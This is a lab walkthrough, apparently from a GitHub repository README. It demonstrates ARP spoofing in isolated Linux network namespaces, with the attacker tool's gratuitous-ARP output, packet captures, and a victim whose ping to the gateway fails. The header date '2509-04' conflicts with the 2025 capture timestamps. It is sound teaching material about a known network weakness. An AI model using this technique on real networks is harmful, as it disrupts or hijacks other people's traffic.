# spoof-arp

- source: [linuxyz/spoof-arp](https://github.com/seantywork/linuxyz/tree/main/spoof-arp)
- date: 2509-04

We can try out ARP spoofing on Linux with the source code and script in this directory.

Below is the layout of the environment created by the `setup.sh` shell script.


```shell
-------------------------
|   host                |
|  11.168.0.1 (veth01)  |
|  82 59 88 10 d3 fe    |
-------------------------
        |
        |
--------------------------
|   vnet0                |    ------------------------
|   bridge (vbr0)        |    | vnet2 (attacker 😈)  |
|    arp_accept enabled, |----| 11.168.0.200 (veth21)|
|    vulnerable to       |    | 22 e8 90 6d 69 e5    |
|    arp spoofing        |    ------------------------
--------------------------
        |
        |
--------------------------
|   vnet1                |
|   11.168.0.2 (veth11)  |
|   26 08 9a c4 c6 d3    |
--------------------------


```
The shell script not only creates the environment but also \
sets `vbr0` to accept unsolicitied ARP packet, which \
makes it vulnerable to ARP spoofing attack.

In other words, if a switch located in that positon doesn't allow for \
unsolicitied ARP packets, you don't have to worry about being ARP spoofed :)

And adding to that, `vnet2` is configured to drop the packets coming in whose \
destination is not `11.168.0.200`, which means any packets set to be forwarded \
will be dropped. 

Let's check out the poor victim's mac table.

```shell
$ sudo ip netns exec vnet1 ip neigh
# no mac info 
$ 

```

Now, let's check if it can ping the host `11.168.0.1` as usual.

```shell
$ sudo ip netns exec vnet1 ping 11.168.0.1
PING 11.168.0.1 (11.168.0.1) 56(84) bytes of data.
64 bytes from 11.168.0.1: icmp_seq=1 ttl=64 time=0.084 ms
64 bytes from 11.168.0.1: icmp_seq=2 ttl=64 time=0.047 ms
64 bytes from 11.168.0.1: icmp_seq=3 ttl=64 time=0.059 ms
64 bytes from 11.168.0.1: icmp_seq=4 ttl=64 time=0.050 ms
^C
--- 11.168.0.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3072ms
rtt min/avg/max/mdev = 0.047/0.060/0.084/0.014 ms

```

Checking mac table again...

```shell
$ sudo ip netns exec vnet1 ip neigh
# now there is mac info!
11.168.0.1 dev veth11 lladdr 82:59:88:10:d3:fe REACHABLE

```

So far so good.

Clear all info from the mac table.

```shell
$ sudo ip netns exec vnet1 ip neigh flush all
$ sudo ip netns exec vnet1 ip neigh 
$

```

Now, we're going to use ARP spoof attack to interfere (DoS) with \
the normal flow of traffic.

In the section below, `g` flag means it will use [gratuitous ARP](https://wiki.wireshark.org/Gratuitous_ARP) to \
perform ARP spoofing. You can also use `ng` to perfrm ARP spoofing \
but it uses unsolicited ARP reply packet to do so.

```shell
$ sudo ip netns exec vnet2 ./spoof.out g
my: ifidx: 2 ip: 11.168.0.200 hw: 22 e8 90 6d 69 e5
victim: ip: 11.168.0.2 hw: 26 08 9a c4 c6 d3
gateway: ip: 11.168.0.1 hw: 82 59 88 10 d3 fe
spoofing? 

```

On the other terminal, I captured the ARP packets going back and forth as you can \
see below.

```shell
$ sudo ip netns exec vnet0 tshark -i vbr0
[sudo] password for thy: 
Running as user "root" and group "root". This could be dangerous.
Capturing on 'vbr0'
    1 0.000000000 22:e8:90:6d:69:e5 → Broadcast    ARP 42 Who has 11.168.0.2? Tell 11.168.0.200
    2 0.000037175 26:08:9a:c4:c6:d3 → 22:e8:90:6d:69:e5 ARP 42 11.168.0.2 is at 26:08:9a:c4:c6:d3
    3 0.000059438 22:e8:90:6d:69:e5 → Broadcast    ARP 42 Who has 11.168.0.1? Tell 11.168.0.200
    4 0.000069170 82:59:88:10:d3:fe → 22:e8:90:6d:69:e5 ARP 42 11.168.0.1 is at 82:59:88:10:d3:fe


```

From the victim's namespace, we can see the updated mac table.

```shell
$ sudo ip netns exec vnet1 ip neigh 
11.168.0.200 dev veth11 lladdr 22:e8:90:6d:69:e5 STALE
```

Now, back to the attacker, and hitting `enter` will make the program to \
send out gratuitous arp to perform spoofing attack.

```shell
$ sudo ip netns exec vnet2 ./spoof.out g
my: ifidx: 2 ip: 11.168.0.200 hw: 22 e8 90 6d 69 e5
victim: ip: 11.168.0.2 hw: 26 08 9a c4 c6 d3
gateway: ip: 11.168.0.1 hw: 82 59 88 10 d3 fe
spoofing? 
gratuitous arp...
gratuitous arp...

```

Seeing from packet capture, you can see that the program is lying \
about its IP association. Specifically, it's saying that IP `11.168.0.1`, \
which is `host`'s IP address is mapped to the attacker's mac address.

If the switch accepts this dubious claim (in our case it does), then any packet \
that's destined to `11.168.0.1` will end up trapped in `11.168.0.200`.

```shell
Frame 4: 42 bytes on wire (336 bits), 42 bytes captured (336 bits) on interface vbr0, id 0
    Section number: 1
    Interface id: 0 (vbr0)
        Interface name: vbr0
    Encapsulation type: Ethernet (1)
    Arrival Time: Sep  2, 2025 13:43:07.035245849 KST
    UTC Arrival Time: Sep  2, 2025 04:43:07.035245849 UTC
    Epoch Arrival Time: 1756788187.035245849
    [Time shift for this packet: 0.000000000 seconds]
    [Time delta from previous captured frame: 5.000146902 seconds]
    [Time delta from previous displayed frame: 5.000146902 seconds]
    [Time since reference or first frame: 15.000502026 seconds]
    Frame Number: 4
    Frame Length: 42 bytes (336 bits)
    Capture Length: 42 bytes (336 bits)
    [Frame is marked: False]
    [Frame is ignored: False]
    [Protocols in frame: eth:ethertype:arp]
Ethernet II, Src: 22:e8:90:6d:69:e5 (22:e8:90:6d:69:e5), Dst: Broadcast (ff:ff:ff:ff:ff:ff)
    Destination: Broadcast (ff:ff:ff:ff:ff:ff)
        Address: Broadcast (ff:ff:ff:ff:ff:ff)
        .... ..1. .... .... .... .... = LG bit: Locally administered address (this is NOT the factory default)
        .... ...1 .... .... .... .... = IG bit: Group address (multicast/broadcast)
    Source: 22:e8:90:6d:69:e5 (22:e8:90:6d:69:e5)
        Address: 22:e8:90:6d:69:e5 (22:e8:90:6d:69:e5)
        .... ..1. .... .... .... .... = LG bit: Locally administered address (this is NOT the factory default)
        .... ...0 .... .... .... .... = IG bit: Individual address (unicast)
    Type: ARP (0x0806)
Address Resolution Protocol (request/gratuitous ARP)
    Hardware type: Ethernet (1)
    Protocol type: IPv4 (0x0800)
    Hardware size: 6
    Protocol size: 4
    Opcode: request (1)
    [Is gratuitous: True]
    Sender MAC address: 22:e8:90:6d:69:e5 (22:e8:90:6d:69:e5)
    Sender IP address: 11.168.0.1
    Target MAC address: Broadcast (ff:ff:ff:ff:ff:ff)
    Target IP address: 11.168.0.1

```

Precisely that happens as you can see from `ping` command below.

```shell
$ sudo ip netns exec vnet1 ping 11.168.0.1
PING 11.168.0.1 (11.168.0.1) 56(84) bytes of data.
64 bytes from 11.168.0.1: icmp_seq=1 ttl=64 time=0.129 ms
64 bytes from 11.168.0.1: icmp_seq=34 ttl=64 time=0.169 ms
^C
--- 11.168.0.1 ping statistics ---
35 packets transmitted, 2 received, 94.2857% packet loss, time 34812ms
rtt min/avg/max/mdev = 0.129/0.149/0.169/0.020 ms


```

It's also confirmed by the packet capture.

```shell
$ sudo ip netns exec vnet0 tshark -i vbr0 -f "icmp"
Running as user "root" and group "root". This could be dangerous.
Capturing on 'vbr0'
    1 0.000000000   11.168.0.2 → 11.168.0.1   ICMP 98 Echo (ping) request  id=0xa180, seq=1/256, ttl=64
    2 0.000063576   11.168.0.1 → 11.168.0.2   ICMP 98 Echo (ping) reply    id=0xa180, seq=1/256, ttl=64 (request in 1)
    3 1.019965141   11.168.0.2 → 11.168.0.1   ICMP 98 Echo (ping) request  id=0xa180, seq=2/512, ttl=64
    4 2.044919873   11.168.0.2 → 11.168.0.1   ICMP 98 Echo (ping) request  id=0xa180, seq=3/768, ttl=64
    5 3.067998313   11.168.0.2 → 11.168.0.1   ICMP 98 Echo (ping) request  id=0xa180, seq=4/1024, ttl=64
    6 4.091929811   11.168.0.2 → 11.168.0.1   ICMP 98 Echo (ping) request  id=0xa180, seq=5/1280, ttl=64
    7 5.115978551   11.168.0.2 → 11.168.0.1   ICMP 98 Echo (ping) request  id=0xa180, seq=6/1536, ttl=64
    8 6.140009603   11.168.0.2 → 11.168.0.1   ICMP 98 Echo (ping) request  id=0xa180, seq=7/1792, ttl=64
    9 7.163937904   11.168.0.2 → 11.168.0.1   ICMP 98 Echo (ping) request  id=0xa180, seq=8/2048, ttl=64
   10 8.187997388   11.168.0.2 → 11.168.0.1   ICMP 98 Echo (ping) request  id=0xa180, seq=9/2304, ttl=64
   11 9.211988746   11.168.0.2 → 11.168.0.1   ICMP 98 Echo (ping) request  id=0xa180, seq=10/2560, ttl=64
   12 10.236013397   11.168.0.2 → 11.168.0.1   ICMP 98 Echo (ping) request  id=0xa180, seq=11/2816, ttl=64
   13 11.260045390   11.168.0.2 → 11.168.0.1   ICMP 98 Echo (ping) request  id=0xa180, seq=12/3072, ttl=64
   14 12.283941056   11.168.0.2 → 11.168.0.1   ICMP 98 Echo (ping) request  id=0xa180, seq=13/3328, ttl=64
   15 13.307911841   11.168.0.2 → 11.168.0.1   ICMP 98 Echo (ping) request  id=0xa180, seq=14/3584, ttl=64
   16 14.331996693   11.168.0.2 → 11.168.0.1   ICMP 98 Echo (ping) request  id=0xa180, seq=15/3840, ttl=64


```

Check out the current status of victim's mac table

```shell

$ sudo ip netns exec vnet1 ip neigh 
11.168.0.200 dev veth11 lladdr 22:e8:90:6d:69:e5 STALE 
11.168.0.1 dev veth11 FAILED

```